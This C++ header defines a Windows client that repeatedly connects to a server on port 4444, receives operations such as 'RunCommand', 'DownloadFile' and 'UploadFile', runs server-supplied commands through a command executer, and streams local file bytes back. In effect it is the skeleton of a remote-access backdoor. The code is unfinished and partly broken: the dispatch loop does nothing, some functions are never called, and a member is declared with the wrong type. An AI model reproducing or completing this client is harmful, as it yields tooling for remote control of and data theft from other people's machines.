#ifndef _CLIENT_H_
#define _CLIENT_H_

#define _WIN32_WINDOWS 0x0A00
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <array>
#include <fstream>
#include <boost/asio.hpp>
#include <string>
#include <iostream>
#include <filesystem>
#include <boost/algorithm/string.hpp>
#include <unordered_map>
#include "CommandExecuter.hpp"


class Client
{
private:
	using IoService = boost::asio::io_service;
	using TcpResolver = boost::asio::ip::tcp::resolver;
	using TcpResolverIterator = TcpResolver::iterator;
	using TcpSocket = boost::asio::ip::tcp::socket;
	enum OperationType { RunCommand = 1, DownloadFile, UploadFile };

public:

	Client(IoService& ioService)
		: m_ioService(ioService), m_socket(ioService), m_path(R"(C:\Users\ariels\Downloads\Src\c.exe)")
	{
		TcpResolver resolver(ioService);
		m_endpointIterator = resolver.resolve({ "127.0.0.1", "4444" });
		Connect();
		Start();
		//OpenFile();
	}

private:

	void Connect()
	{
		while(true)
		{
			boost::asio::connect(m_socket, m_endpointIterator, m_errorCode);
			if (!m_errorCode)
				return;

			std::cout << "Coudn't connect to server. Check that it is up and listening " << std::endl;

			m_socket.close();
			std::this_thread::sleep_for(std::chrono::seconds(3));
		}

		std::cout << "Connected to: " << m_socket.remote_endpoint().address().to_string() << std::endl;
	}

	void Start()
	{
		while (true)
		{
			switch (ReadOperationType())
			{
			case RunCommand:
				break;
			default:
				break;
			}
		}
	}

	OperationType ReadOperationType()
	{
		m_responseBuf.consume(m_responseBuf.size());
		auto responseSize = boost::asio::read_until(m_socket, m_responseBuf, "\n\n", m_errorCode);
		if (m_errorCode)
			throw; // TODO - handle error
		
		auto operation = CleanReponse(responseSize);
		return GetOperationType(operation);
	}
	
	std::string CleanReponse(size_t responseSize)
	{
		std::string response((std::istreambuf_iterator<char>(&m_responseBuf)), std::istreambuf_iterator<char>());
		std::string operation = response.substr(0, responseSize);
		boost::algorithm::trim(operation);

		return operation;
	}

	OperationType GetOperationType(const std::string& operation)
	{
		std::unordered_map<std::string, OperationType> operations
		{
			{"RunCommand", RunCommand},
			{"DownloadFile", DownloadFile},
			{"UploadFile", UploadFile}
		};

		if (!operations.count(operation))
			;// throw exception

		return operations[operation];
	}
	
	void Command()
	{
		// TODO - Code duplication with ReadOperationType()
		m_responseBuf.consume(m_responseBuf.size());
		auto responseSize = boost::asio::read_until(m_socket, m_responseBuf, "\n\n", m_errorCode);
		if (m_errorCode)
			throw; // TODO - handle error

		auto command = CleanReponse(responseSize);
		CommandExecuter commandExecuter;
		auto commandResult = commandExecuter.RunCommand(command);
		std::ostream requestStream(&m_requestBuf);
		requestStream << commandResult;
	}

	void OpenFile()
	{
		m_sourceFile.open(m_path, std::ios_base::binary);
		if (m_sourceFile.fail())
			throw std::fstream::failure("Failed while opening file " + m_path);

		auto fileSize = std::filesystem::file_size(m_path);
		std::ostream requestStream(&m_requestBuf);
		std::filesystem::path filePath(m_path);
		requestStream << filePath.filename().string() << "\n" << fileSize << "\n\n";
	}


	template<typename Buffer>
	void Send(Buffer& t_buffer) 
	{
		boost::asio::async_write(m_socket, t_buffer,
			[this](const boost::system::error_code& ec, std::size_t)
			{
				ReadFileBytes(ec);
			});
	}

	void ReadFileBytes(const boost::system::error_code& ec)
	{
		if (ec || !m_sourceFile)
			return;

		// Read 1024 bytes from the file into a char array
		m_sourceFile.read(m_buf.data(), m_buf.size());
		if (m_sourceFile.fail() && !m_sourceFile.eof()) {
			auto msg = "Failed while reading file";
			throw std::fstream::failure(msg);
		}

		std::stringstream ss;
		ss << "Send " << m_sourceFile.gcount() << " bytes, total: "
			<< m_sourceFile.tellg() << " bytes";
		std::cout << ss.str() << std::endl;

		// Converte the char array to a correct buffer type and send it. 
		auto buf = boost::asio::buffer(m_buf.data(), static_cast<size_t>(m_sourceFile.gcount()));
		Send(buf);
	}

	TcpResolver m_ioService;
	TcpSocket m_socket;
	TcpResolverIterator m_endpointIterator;
	boost::asio::streambuf m_requestBuf;
	boost::asio::streambuf m_responseBuf;
	std::array<char, 1024> m_buf;
	std::ifstream m_sourceFile;
	std::string m_path;
	boost::system::error_code m_errorCode;
};

#endif // !_CLIENT_H_
